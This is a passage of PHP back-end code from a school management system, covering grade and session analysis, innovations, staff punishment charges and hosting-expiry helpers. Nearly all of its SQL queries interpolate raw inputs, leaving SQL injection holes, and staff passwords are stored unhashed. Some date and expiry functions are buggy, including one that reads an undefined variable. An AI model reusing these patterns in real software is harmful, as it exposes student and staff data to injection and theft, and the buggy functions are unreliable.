  public static function ReadSessionStatisticalAnalysisDetails($reg_no,$class,$session){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where reg_no='$reg_no' and class='$class' and session='$session'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['reg_no']=$res['reg_no'];
        $news['class']=$res['class'];
        $news['session']=$res['session'];
        $news['total']=$res['total'];
        $news['grade']=$res['grade'];
        $news['average']=$res['average'];
        $news['remark']=$res['remark'];
        $news['position']=$res['position'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }
  

  public static function GetSubjectHighestScoreSessionp($subject,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT max(total) from psession_statistical_analysis where session='$session' ");
    if($res=mysqli_fetch_array($query))
    {
      return $res[0];
    }
  }  
  
   /** This is to Read Voucher Details*/
  public static function ReadSessionStatisticalAnalysisDetails1($reg_no,$session){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where reg_no='$reg_no' and session='$session'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['reg_no']=$res['reg_no'];
        $news['class']=$res['class'];
        $news['session']=$res['session'];
        $news['total']=$res['total'];
        $news['grade']=$res['grade'];
        $news['average']=$res['average'];
        $news['remark']=$res['remark'];
        $news['position']=$res['position'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }

  /** This is to Delete Fee*/
  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from activities where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  /** This is to Read All Activities*/
  public static function ReadClassSsessionTotals($session,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where session='$session' and class='$class' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['total'], $news))){
          array_push($news, $res['total']);
        }
      }
      
      return $news;
  }

  /** This is to Read All Activities*/
  public static function CountClassSsessionTotalsStudents($session,$class,$total){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where session='$session' and class='$class' and total='$total' ");
    $res=mysqli_num_rows($query);

    return $res;
  }

  /** This is to Read All Activities*/
  public static function ReadClassSsessionTotalsStudents($session,$class,$total){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where session='$session' and class='$class' and total='$total' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          array_push($news, $res['id']);
      }
      
      return $news;
  }

  /** This is to Read All Activities*/
  public static function ReadStatisticalAnalysis($session){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pstatistical_analysis where session='$session' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  /** This is to Read All Activities*/
  public static function ReadSessionStatisticalAnalysis($session){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where session='$session' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }
  
  
  //Student Module Starts
  public static function IsStudentSessionSubjectScoreExistp($reg_no,$session,$subject){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psession_subject_statistical_analysis where reg_no='$reg_no' and session='$session' and subject='$subject'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  /** Get Student's Subject total score for a session*/
  public static function GetStudentSessionSubjectScorep($regno,$session,$subject){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where reg_no='$regno' and session='$session' and subject='$subject'");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }
  
  /** Update Student's Session Statistics for a Particular Subject*/
  public static function UpdateSessionSubjectStatisticsp($reg_no,$session,$class,$subject,$total,$grade,$remark,$average,$position)
  {
    $query=mysqli_query(dbass::Connect(),"UPDATE psession_subject_statistical_analysis set total='$total', grade='$grade',remark='$remark',average='$average',position='$position' where  reg_no='$reg_no' and class='$class' and session='$session' and subject='$subject'");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }
    

    return $news;
  }
  
  /** Update Student's Session Statistics for a Particular Subject*/
  public static function InsertSessionSubjectStatisticsp($reg_no,$session,$class,$subject,$total,$grade,$remark,$average,$position)
  {
    $query=mysqli_query(dbass::Connect(),"INSERT into psession_subject_statistical_analysis(reg_no,session,class,subject,total,grade,remark,average,position) values('$reg_no','$session','$class','$subject','$total','$grade','$remark','$average','$position')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }
    

    return $news;
  }
  
  public static function GenerateSessionSubjectStatisticsp($class,$session,$subject)
  {
    $Students=Module::ReadClassStudentsp($class);
    foreach($Students as $reg_no)
    {
      $total=Analysis::GetStudentSessionSubjectScorep($reg_no,$session,$subject);
      
      $courseCount=Module::CountSubjectsp($class);
      if($total<=((49/100)*(300)))
      {
        $Remark="Fail";
        $Grade="F";
      }
      elseif($total<=((59/100)*(300)))
      {
        $Remark="Fair";
        $Grade="D";
      }
      elseif($total<=((69/100)*(300)))
      {
        $Remark="Pass";
        $Grade="D";
      }
      elseif($total<=((78/100)*(300)))
      {
        $Remark="Credit";
        $Grade="C";
      }
      elseif($total<=((89/100)*(300)))
      {
        $Remark="Very Good";
        $Grade="B";
      }
      else
      {
        $Remark="Excellent";
        $Grade="A";
      }

      $average=round(($total)/3);
      if(Analysis::IsStudentSessionSubjectScoreExistp($reg_no,$session,$subject))
      {
        if(Analysis::UpdateSessionSubjectStatisticsp($reg_no,$session,$class,$subject,$total,$Grade,$Remark,$average,$position))
        {
          $status=true;
        }
        else
        {
          $status=false;
        }                
      }
      else
      {
        if(Analysis::InsertSessionSubjectStatisticsp($reg_no,$session,$class,$subject,$total,$Grade,$Remark,$average,$position))
        {
          $status=true;                  
        }
        else
        {
          $status=false;
        }
      }
    }
    
    return $status;
  }
  //============================================== saving result analysis====== to presult_analysis
  public static function UpdateRemarkManuallyp($reg_no,$class,$session,$term,$remark){
    if(Module::IsStudentInAnalysisp($reg_no,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set remark='$remark'  where reg_no='$reg_no' and session='$session' and term='$term' and class='$class' ");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

    }
    return $news;
  }

  public static function SaveAnalysisp($reg_no,$class,$session,$term,$ca1_total,$ca1_average,$ca1_grade,$ca1_remark,$ca2_total,$ca2_average,$ca2_grade,$ca2_remark,$ca3_total,$ca3_average,$ca3_grade,$ca3_remark,$exam_total,$exam_average,$exam_grade,$exam_remark,$total,$average,$grade,$remark,$totalstudentsubject){
    if(Module::IsStudentInAnalysisp($reg_no,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set  ca1_total='$ca1_total',ca1_average='$ca1_average',ca1_grade='$ca1_grade',ca1_remark='$ca1_remark', ca2_total='$ca2_total',ca2_average='$ca2_average',ca2_grade='$ca2_grade',ca2_remark='$ca2_remark', ca3_total='$ca3_total',ca3_average='$ca3_average',ca3_grade='$ca3_grade',ca3_remark='$ca3_remark', exam_total='$exam_total',exam_average='$exam_average',exam_grade='$exam_grade',exam_remark='$exam_remark', total='$total', average='$average', grade='$grade', remark='$remark', totalstudentsubject='$totalstudentsubject'  where reg_no='$reg_no' and session='$session' and term='$term' and class='$class' ");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT INTO `presult_analysis` (`reg_no`, `class`, `session`, `term`, `ca1_total`, `ca1_average`, `ca1_grade`, `ca1_remark`, `ca2_total`, `ca2_average`, `ca2_grade`, `ca2_remark`, `ca3_total`, `ca3_average`, `ca3_grade`, `ca3_remark`, `exam_total`, `exam_average`, `exam_grade`, `exam_remark`, `total`, `average`, `grade`, `remark`, `totalstudentsubject`) VALUES ('$reg_no', '$class', '$session', '$term', '$ca1_total', '$ca1_average', '$ca1_grade', '$ca1_remark', '$ca2_total', '$ca2_average', '$ca2_grade', '$ca2_remark', '$ca3_total', '$ca3_average', '$ca3_grade', '$ca3_remark', '$exam_total', '$exam_average', '$exam_grade', '$exam_remark', '$total', '$average', '$grade', '$remark', '$totalstudentsubject')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    return $news;
  }


  public static function SaveSessionAnalysisp($reg_no,$class,$session,$firstTotal,$firstAverage,$firstPosition,$firstGrade,$firstRemark,$secondTotal,$secondAverage,$secondPosition,$secondGrade,$secondRemark,$thirdTotal,$thirdAverage,$thirdPosition,$thirdGrade,$thirdRemark,$total,$average,$grade,$remark){
    if(Analysis::IsSessionStatisticsExist($reg_no,$class,$session))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE psession_statistical_analysis set  1st_term_total='$firstTotal',1st_term_average='$firstAverage',1st_term_position='$firstPosition',1st_term_grade='$firstGrade', 1st_term_remark='$firstRemark',   2nd_term_total='$secondTotal',2nd_term_average='$secondAverage',2nd_term_position='$secondPosition',2nd_term_grade='$secondGrade', 2nd_term_remark='$secondRemark',   3rd_term_total='$thirdTotal',3rd_term_average='$thirdAverage',3rd_term_position='$thirdPosition',3rd_term_grade='$thirdGrade', 3rd_term_remark='$thirdRemark',     total='$total', average='$average', grade='$grade', remark='$remark'  where reg_no='$reg_no' and session='$session'  and class='$class' ");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT INTO `psession_statistical_analysis` (`reg_no`, `class`, `session`, `1st_term_total`,`1st_term_average`,`1st_term_position`,`1st_term_grade`,`1st_term_remark`, `2nd_term_total`,`2nd_term_average`,`2nd_term_position`,`2nd_term_grade`,`2nd_term_remark`, `3rd_term_total`,`3rd_term_average`,`3rd_term_position`,`3rd_term_grade`,`3rd_term_remark`, `total`, `average`, `grade`, `remark`) VALUES ('$reg_no', '$class', '$session', '$firstTotal', '$firstAverage', '$firstPosition', '$firstGrade', '$firstRemark', '$secondTotal', '$secondAverage', '$secondPosition', '$secondGrade', '$secondRemark', '$thirdTotal', '$thirdAverage', '$thirdPosition', '$thirdGrade', '$thirdRemark', '$total', '$average', '$grade', '$remark')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    return $news;
  }

  public static function ProcessResultAnalysisp($reg_no,$class,$session,$term,$totalstudentsubject)
  {
    Module::DeleteAnalysisResultp($reg_no,$session,$term,$class);

    $ca1=Analysis::ExtractCA1Summary($reg_no,$class,$session,$term);
    $ca2=Analysis::ExtractCA2Summary($reg_no,$class,$session,$term);
    $ca3=Analysis::ExtractCA3Summary($reg_no,$class,$session,$term);
    $exam=Analysis::ExtractExamSummary($reg_no,$class,$session,$term);
    $overall=Analysis::ExtractOverallSummary($reg_no,$class,$session,$term);
    
    if(Analysis::SaveAnalysisp($reg_no,$class,$session,$term,$ca1['total'],$ca1['average'],$ca1['grade'],$ca1['remark'],$ca2['total'],$ca2['average'],$ca2['grade'],$ca2['remark'],$ca3['total'],$ca3['average'],$ca3['grade'],$ca3['remark'],$exam['total'],$exam['average'],$exam['grade'],$exam['remark'],$overall['total'],$overall['average'],$overall['grade'],$overall['remark'],$totalstudentsubject))
    {
      $response=true;
    }
    else
    {
      $response=false;
    }

    return $response;
  }

  public static function SaveSubjectSessionAnalysisp($reg_no,$class,$session,$subject,$ca1_total,$ca1_average,$ca1_grade,$ca1_remark,$ca2_total,$ca2_average,$ca2_grade,$ca2_remark,$ca3_total,$ca3_average,$ca3_grade,$ca3_remark,$exam_total,$exam_average,$exam_grade,$exam_remark,$total,$average,$grade,$remark){

    if(Analysis::IsSessionSubjectStatisticsExist($reg_no,$class,$session,$subject))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE psubject_analysis set  ca1_total='$ca1_total',ca1_average='$ca1_average',ca1_grade='$ca1_grade',ca1_remark='$ca1_remark',
      ca2_total='$ca2_total',ca2_average='$ca2_average',ca2_grade='$ca2_grade',ca2_remark='$ca2_remark',
      ca3_total='$ca3_total',ca3_average='$ca3_average',ca3_grade='$ca3_grade',ca3_remark='$ca3_remark',
      exam_total='$exam_total',exam_average='$exam_average',exam_grade='$exam_grade',exam_remark='$exam_remark',total='$total',average='$average',grade='$grade',remark='$remark'  where reg_no='$reg_no' and session='$session' and subject='$subject'  and class='$class' ");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT INTO `psubject_analysis` (`reg_no`, `session`, `class`, `subject`, `ca1_total`, `ca1_average`, `ca1_grade`, `ca1_remark`, `ca2_total`, `ca2_average`, `ca2_grade`, `ca2_remark`, `ca3_total`, `ca3_average`, `ca3_grade`, `ca3_remark`, `exam_total`, `exam_average`,  `exam_grade`, `exam_remark`, `total`, `average`, `grade`, `remark`) VALUES ('$reg_no', '$session', '$class', '$subject', '$ca1_total', '$ca1_average', '$ca1_grade', '$ca1_remark', '$ca2_total', '$ca2_average', '$ca2_grade', '$ca2_remark', '$ca3_total', '$ca3_average', '$ca3_grade', '$ca3_remark', '$exam_total', '$exam_average',  '$exam_grade', '$exam_remark', '$total', '$average', '$grade', '$remark');");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    return $news;
  }

  public static function ReadSessionSubjectResultAnalysisp($reg_no,$subject,$session){
    $query=mysqli_query(dbass::Connect(),"SELECT * from psubject_analysis where reg_no='$reg_no' and session='$session' and subject='$subject' ");
    
    while($res=mysqli_fetch_array($query))
    {
      $news['ca1_total']= $res['ca1_total'];
      $news['ca1_average']= $res['ca1_average'];
      $news['ca1_position']= $res['ca1_position'];
      $news['ca1_grade']= $res['ca1_grade'];
      $news['ca1_remark']= $res['ca1_remark'];


      $news['ca2_total']= $res['ca2_total'];
      $news['ca2_average']= $res['ca2_average'];
      $news['ca2_position']= $res['ca2_position'];
      $news['ca2_grade']= $res['ca2_grade'];
      $news['ca2_remark']= $res['ca2_remark'];


      $news['ca3_total']= $res['ca3_total'];
      $news['ca3_average']= $res['ca3_average'];
      $news['ca3_position']= $res['ca3_position'];
      $news['ca3_grade']= $res['ca3_grade'];
      $news['ca3_remark']= $res['ca3_remark'];


      $news['exam_total']= $res['exam_total'];
      $news['exam_average']= $res['exam_average'];
      $news['exam_position']= $res['exam_position'];
      $news['exam_grade']= $res['exam_grade'];
      $news['exam_remark']= $res['exam_remark'];


      $news['total']= $res['total'];
      $news['average']= $res['average'];
      $news['position']= $res['position'];
      $news['grade']= $res['grade'];
      $news['remark']= $res['remark'];
    }
    
    return $news;
  }

  public static function ProcessSubjectResultAnalysisp($reg_no,$class,$session)
  {
    $Subjects=Module::ReadClassSubjectsp($class);
    foreach($Subjects as $subject)
    {
      $resAnalysis=Module::ExtractSessionSubjectResultAnalysisp($reg_no,$subject,$session,$class);

      if(Analysis::SaveSubjectSessionAnalysisp($reg_no,$class,$session,$subject,$resAnalysis['ca1_total'],$resAnalysis['ca1_average'],$resAnalysis['ca1_grade'],$resAnalysis['ca1_remark'],$resAnalysis['ca2_total'],$resAnalysis['ca2_average'],$resAnalysis['ca2_grade'],$resAnalysis['ca2_remark'],$resAnalysis['ca3_total'],$resAnalysis['ca3_average'],$resAnalysis['ca3_grade'],$resAnalysis['ca3_remark'],$resAnalysis['exam_total'],$resAnalysis['exam_average'],$resAnalysis['exam_grade'],$resAnalysis['exam_remark'],$resAnalysis['total_total'],$resAnalysis['total_average'],$resAnalysis['total_grade'],$resAnalysis['total_remark'])){
        $res=true;
      }
      else
      {
        $res=false;
      }

    }
    
    return $res;
  }

  public static function ProcessSessionResultAnalysisp($reg_no,$class,$session)
  {

    $first=Analysis::ReadResultAnalysisp($reg_no,$session,"First");
    $second=Analysis::ReadResultAnalysisp($reg_no,$session,"Second");
    $third=Analysis::ReadResultAnalysisp($reg_no,$session,"Third");

    $total=round(Module::GetSessionTotalScorep($reg_no,$session),2);
    $totalSubject=Module::CountSessionSubjectResultp($reg_no,$session);



    $average=round($total/$totalSubject,2);



    $GradeGetails=Grades::ReadScoreDetails($average);
    $grade=$GradeGetails['grade_symbol'];
    $remark=$GradeGetails['grade_remark_anal'];

    
    if(Analysis::SaveSessionAnalysisp($reg_no,$class,$session,$first['total'],$first['average'],$first['position'],$first['grade'],$first['remark'],$second['total'],$second['average'],$second['position'],$second['grade'],$second['remark'],$third['total'],$third['average'],$third['position'],$third['grade'],$third['remark'],$total,$average,$grade,$remark))
    {
      $response="Success";
    }
    else
    {
      $response="Failed ";
    }

    return $response;
  }

  /** This is to Read All Activities*/
  public static function ReadOverallSessionBestStudents($session,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where session='$session' and class='$class' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['reg_no'], $news)){
            array_push($news, $res['reg_no']);
          }
      }
      
      return $news;
  }

  public static function ReadSessionResultAnalysisp($reg_no,$session,$class){
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where reg_no='$reg_no' and session='$session' and class='$class' ");
    
    while($res=mysqli_fetch_array($query))
    {
      $news['1st_term_total']= $res['1st_term_total'];
      $news['1st_term_average']= $res['1st_term_average'];
      $news['1st_term_remark']= $res['1st_term_remark'];
      $news['1st_term_grade']= $res['1st_term_grade'];
      $news['1st_term_position']= $res['1st_term_position'];


      $news['2nd_term_total']= $res['2nd_term_total'];
      $news['2nd_term_average']= $res['2nd_term_average'];
      $news['2nd_term_remark']= $res['2nd_term_remark'];
      $news['2nd_term_grade']= $res['2nd_term_grade'];
      $news['2nd_term_position']= $res['2nd_term_position'];


      $news['3rd_term_total']= $res['3rd_term_total'];
      $news['3rd_term_average']= $res['3rd_term_average'];
      $news['3rd_term_remark']= $res['3rd_term_remark'];
      $news['3rd_term_grade']= $res['3rd_term_grade'];
      $news['3rd_term_position']= $res['3rd_term_position'];

      $news['total']= $res['total'];
      $news['average']= $res['average'];
      $news['remark']= $res['remark'];
      $news['grade']= $res['grade'];
      $news['position']= $res['position'];
    }
    
    return $news;
  }


  public static function ReadResultAnalysisp($reg_no,$session,$term){
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where reg_no='$reg_no' and session='$session' and term='$term' ");
    
    while($res=mysqli_fetch_array($query))
    {
      $news['totalstudentsubject']=Module::CountSessionSubjectResultp($reg_no,$session);

      $news['ca1_total']= $res['ca1_total'];
      $news['ca1_average']= $res['ca1_average'];
      $news['ca1_remark']= $res['ca1_remark'];
      $news['ca1_grade']= $res['ca1_grade'];
      $news['ca1_position']= $res['ca1_position'];
      
      $news['ca2_total']= $res['ca2_total'];
      $news['ca2_average']= $res['ca2_average'];
      $news['ca2_remark']= $res['ca2_remark'];
      $news['ca2_grade']= $res['ca2_grade'];
      $news['ca2_position']= $res['ca2_position'];

      $news['ca3_total']= $res['ca3_total'];
      $news['ca3_average']= $res['ca3_average'];
      $news['ca3_remark']= $res['ca3_remark'];
      $news['ca3_grade']= $res['ca3_grade'];
      $news['ca3_position']= $res['ca3_position'];

      $news['exam_total']= $res['exam_total'];
      $news['exam_average']= $res['exam_average'];
      $news['exam_remark']= $res['exam_remark'];
      $news['exam_grade']= $res['exam_grade'];
      $news['exam_position']= $res['exam_position'];

      $news['total']= $res['total'];
      $news['average']= $res['average'];
      $news['remark']= $res['remark'];
      $news['grade']= $res['grade'];
      $news['position']= $res['position'];
    }
    
    return $news;
  }
}

/**
 * Innovation Module for the integrating Institutions
 */
class Innovation extends dbass {
  public static function IsExist($innovation_id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from innovations where id='$innovation_id'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }


  public static function AddNew($innovation_author_id, $innovation_author_type, $innovation_title, $innovation_type, $innovation_description, $innovation_date){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into innovations(innovation_author_id,innovation_author_type,innovation_title,innovation_type,innovation_description,innovation_date) values('$innovation_author_id','$innovation_author_type','$innovation_title','$innovation_type','$innovation_description','$innovation_date')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function ChangeInnovationCoverPhoto($innovation_id,$innovation_cover_photo)
  {
     $query=mysqli_query(dbass::Connect(),"UPDATE innovations set innovation_cover_photo='$innovation_cover_photo' where  id='$innovation_id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ChangeInnovationFile($innovation_id,$innovation_file)
  {
     $query=mysqli_query(dbass::Connect(),"UPDATE innovations set innovation_file='$innovation_file' where id='$innovation_id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  

  public static function ChangeInnovationVideo($innovation_id,$innovation_video)
  {
     $query=mysqli_query(dbass::Connect(),"UPDATE innovations set innovation_video='$innovation_video' where id='$innovation_id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function UpdateStaff($id,$staffid,$name,$password,$post,$email,$phone,$status,$date_employed,$date_resigned,$sgl,$address){
    if(Module::IsStaffIdExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE staff set staff_id='$staffid', names='$name', password='$password', post='$post', email='$email' , phone='$phone' , status='$status' , date_employed='$date_employed', date_resigned='$date_resigned', sgl='$sgl', address='$address' where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }


  public static function Update($id,$innovation_author_id, $innovation_author_type, $innovation_title, $innovation_type, $innovation_description, $innovation_date){
    if(Innovation::IsExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE innovations set innovation_author_id='$innovation_author_id', innovation_author_type='$innovation_author_type', innovation_title='$innovation_title', innovation_type='$innovation_type', innovation_description='$innovation_description' , innovation_date='$innovation_date' where id='$id'");
      if($query){
        echo "Success";
        $news=true;
      }
      else{
        echo "Failed";
        $news=false;
      }
    }
    else
    {
      echo "Does not exist";
      $news=false;
    }

      return $news;
  }


  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from innovations where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function SearchStudents($src){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where names like '%$src%' or  reg_no like '%$src%' or  class like '%$src%' or  session like '%$src%' or  date_admitted like '%$src%' order by names");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['reg_no'], $news)){
            array_push($news, $res['reg_no']);
          }
      }
      
      return $news;
  }

  public static function ReadAuthorInnovations($innovation_author_id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from innovations where innovation_author_id='$innovation_author_id'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadAllInnovations(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from innovations ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadDetails($innovation_id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from innovations where id='$innovation_id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['innovation_author_id']=$res['innovation_author_id'];
        $news['innovation_author_type']=$res['innovation_author_type'];
        $news['innovation_title']=$res['innovation_title'];
        $news['innovation_type']=$res['innovation_type'];
        $news['innovation_description']=$res['innovation_description'];
        $news['innovation_date']=$res['innovation_date'];
        $news['innovation_cover_photo']=$res['innovation_cover_photo'];
        $news['innovation_file']=$res['innovation_file'];
        $news['innovation_video']=$res['innovation_video'];
        $news['innovation_timestamp']=$res['innovation_timestamp'];
      }
      
      return $news;
  }
}

/**
 * Punnishment Charges Module for the integrating Institutions
 */
class PunnishmentCharges extends dbass {
  public static function IsExist($id,$month,$year){
      $query=mysqli_query(dbass::Connect(),"SELECT * from punnishment_charges where id='$id' or ( month='$month' and year='$year')");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddNew($month,$year,$lateness,$duty,$lesson_plan_note,$absenteesm){
    
    $query=mysqli_query(dbass::Connect(),"INSERT INTO `punnishment_charges`(`month`, `year`, `lateness`, `duty`, `lesson_plan_note`, `absenteesm`) VALUES ('$month','$year','$lateness','$duty','$lesson_plan_note','$absenteesm')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function UpdatePunnishmentCharge($id,$month,$year,$lateness,$duty,$lesson_plan_note,$absenteesm){
    if(PunnishmentCharges::IsExist($id,$month,$year))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE punnishment_charges set month='$month', year='$year', lateness='$lateness', duty='$duty', lesson_plan_note='$lesson_plan_note' , absenteesm='$absenteesm' where id='$id' or (month='$month' and year='$year')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function Delete($id,$month,$year){
      $query=mysqli_query(dbass::Connect(),"DELETE from punnishment_charges where id='$id' or ( month='$month' and year='$year')");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllPunnishmentCharges(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from punnishment_charges order by id ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadDetails($id,$month,$year){
      $query=mysqli_query(dbass::Connect(),"SELECT * from punnishment_charges where id='$id' or ( month='$month' and year='$year')");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['month']=$res['month'];
        $news['year']=$res['year'];
        $news['lateness']=$res['lateness'];
        $news['duty']=$res['duty'];
        $news['lesson_plan_note']=$res['lesson_plan_note'];
        $news['absenteesm']=$res['absenteesm'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }
}

/**
 * Subscriber's setting and updater
 */
class School extends dbass
{



  public static function IsHostingExpired($hosting_due_date){
    
      $expiry_date=explode("-",$hosting_sub_date);
      $current_date=explode("-",date("Y-m-d"));

      $expY=$expiry_date[0];
      $expM=$expiry_date[1];
      $expD=$expiry_date[2];


      $curY=$current_date[0];
      $curM=$current_date[1];
      $curD=$current_date[2];

      if($curY>$expY)
      {
        $response=true;
      }
      elseif(($curY==$expY)&&($curM>$expM))
      {
        $response=true;
      }
      elseif((($curY==$expY)&&($curM==$expM))&&($curD>=$expD))
      {
        $response=true;
      }
      else
      {
        $response=false;
      }
    return $response;
  }

  public static function IsDomainExpired($domain_due_date){
      
    $expiry_date=explode("-",$domain_due_date);
    $current_date=explode("-",date("Y-m-d"));

    $expY=$expiry_date[0];
    $expM=$expiry_date[1];
    $expD=$expiry_date[2];


    $curY=$current_date[0];
    $curM=$current_date[1];
    $curD=$current_date[2];

    if($curY>$expY)
    {
      $response=true;
    }
    elseif(($curY==$expY)&&($curM>$expM))
    {
      $response=true;
    }
    elseif((($curY==$expY)&&($curM==$expM))&&($curD>=$expD))
    {
      $response=true;
    }
    else
    {
      $response=false;
    }
    return $response;
  }



  public static function WorkDateDifference($date1,$date2){
      
    $date1=explode("-",$date1);
    $date2=explode("-",$date2);

    $date1Y=$date1[0];
    $date1M=$date1[1];
    $date1D=$date1[2];

    $date2Y=$date2[0];
    $date2M=$date2[1];
    $date2D=$date2[2];

    $date1Days=(($date1Y*360)-($date1M*30)-$date1D);
    $date2Days=(($date2Y*360)-($date2M*30)-$date2D);

    $dateDiff=$date2Days-$date1Days;


    
    $response['year']=round($dateDiff/360,1);
    $response['month']=round($dateDiff/30,1);
    $response['day']=round($dateDiff,1);



    return $response;
  }

  public static function HostingExpiryDay($hosting_due_date){
      
    $expiry_date=explode("-",$hosting_due_date);
    $current_date=explode("-",date("Y-m-d"));

    $expY=$expiry_date[0]-1;
    $expM=$expiry_date[1];
    $expD=$expiry_date[2];

    $hosting_expiry_day=($expY*360)+($expM*30)+($expD);


    $curY=$current_date[0]-1;
    $curM=$current_date[1];
    $curD=$current_date[2]; 

    $current_day=($curY*360)+($curM*30)+($curD);
    
    $response['expiry_day']=$hosting_expiry_day;
    $response['current_day']=$current_day;
    $response['day_diff']=$hosting_expiry_day-$current_day;



    return $response;
  }
  

  public static function DomainExpiryDay($domain_due_date){
    
    $expiry_date=explode("-",$domain_due_date);
    $current_date=explode("-",date("Y-m-d"));

    $expY=$expiry_date[0]-1;
    $expM=$expiry_date[1];
    $expD=$expiry_date[2];

    $hosting_expiry_day=($expY*360)+($expM*30)+($expD);


    $curY=$current_date[0]-1;
    $curM=$current_date[1];
    $curD=$current_date[2]; 

    $current_day=($curY*360)+($curM*30)+($curD);
    
    $response['expiry_day']=$hosting_expiry_day;
    $response['current_day']=$current_day;
    $response['day_diff']=$hosting_expiry_day-$current_day;



    return $response;
  }



  public static function Today(){
      
    $current_date=explode("-",date("Y-m-d"));

    $curY=$current_date[0]-1;
    $curM=$current_date[1];
    $curD=$current_date[2]; 

    $current_day=($curY*360)+($curM*30)+($curD);
    
    $response=$current_day;

    return $response;
  }

  public static function IsSlideExist($name){
      $query=mysqli_query(dbass::Connect(),"SELECT * from slide_show where name='$name'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddNewSlide($slidename, $slidedescription){    
    $query=mysqli_query(dbass::Connect(),"INSERT into `slide_show`(`name`, `description`) values('$slidename','$slidedescription')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
